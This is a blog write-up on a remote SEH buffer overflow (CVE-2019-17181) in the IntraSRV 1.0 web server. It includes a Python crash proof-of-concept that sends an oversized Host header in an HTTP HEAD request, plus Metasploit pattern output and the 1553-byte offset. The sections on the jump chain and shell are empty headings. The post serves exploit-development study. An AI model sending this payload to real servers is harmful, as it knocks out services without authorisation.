---
layout: single
title: Remote SEH overflow with multi-staged jumps - CVE-2019-17181 from IntraSRV 
---

Sending a unauthenticated and malicious HTTP HEAD request to the application results in a SEH based buffer overflow. This exploit utilizes a short JMP which hits a long JMP back 450 bytes which then hits a standard calculator shellcode payload

## IntraSRV webserver 1.0 SEH overflow writeup

```
# Exploit Title: IntraSRV webserver 1.0 SEH overflow writeup
# Date: 10/10/2019
# Exploit Author: x00pwn
# Vendor Homepage: http://www.leighb.com
# Software Link: http://www.leighb.com/intrasrv.htm
# Version: 1.0	
# Tested on: Windows 7
# CVE : CVE-2019-17181
```

## Introduction

This post covers the exploitation of a remote s c h buffer overflow vulnerability in the intrasrv  web server application, the web server application includes this vulnerability when processing HTTP head requests. 

We can start by running the vulnerable application, and attaching it to immunity debugger.

![remotedjmps1.png](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/remoteseh-d-jmp/remotedjmps1.png)

With our python exploit script, we can start by using a socket connection to send a HTTP request on port 80 to the vulnerable application.  By including a large buffer of A’s,  we can witness the vulnerability taking place via the application crashing, and we see that it is now in a stopped state within our debugger.

```python
#!/usr/bin/python

import socket
from struct import *

victim_host = "10.0.0.161"
victim_port = 80

exploit_payload = "A" * 4000

http_request  = "HEAD / HTTP/1.1\r\n"
http_request += "Host:" + exploit_payload + "\r\n"
http_request += "User-Agent: firefox \r\n"
http_request += "If-Modified-Since: Wed \r\n\r\n"

expl = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

try:
	print("[*] Intrasrv webserver 1.0 SEH overflow POC\n")
	expl.connect((victim_host, victim_port))
	print("[*] Establishing a connection to the vicitm")
	expl.send(http_request)
	print("[*] Sending the payload")
	expl.close()
except:
	print("[!] Exploit failed to send")
```

![remotedjmps2.png](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/remoteseh-d-jmp/remotedjmps2.png)

## Calculate the buffer, find POPPOPRET

Now that we know that the application is vulnerable, we need to conduct the stage of exploitation where we calculate the input buffer size, this can be done with the pattern_create  tool from Metasploit

```
└─▪ ./pattern_create.rb -l 4000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7.... and more...

```

Adding this unique string to our request  shows us that the Structured Exception Handler and NSEH has been overwritten with a part of the unique string.

![remotedjmps3.png](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/remoteseh-d-jmp/remotedjmps3.png)

Now we need to use the mona.py  extension command !mona findmsp  to calculate the size of the input buffer, based on our uniquely generated string that we gave to the application.

![remotedjmps4.png](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/remoteseh-d-jmp/remotedjmps4.png)

Now we know it only takes 1553 bytes to fill up the input buffer, the next 4 bytes after this will overwrite the SEH handler, and 4 more bytes will overwrite the NSEH handler in the chain also.

## Implement multiple JMPs

## Obtain a shell
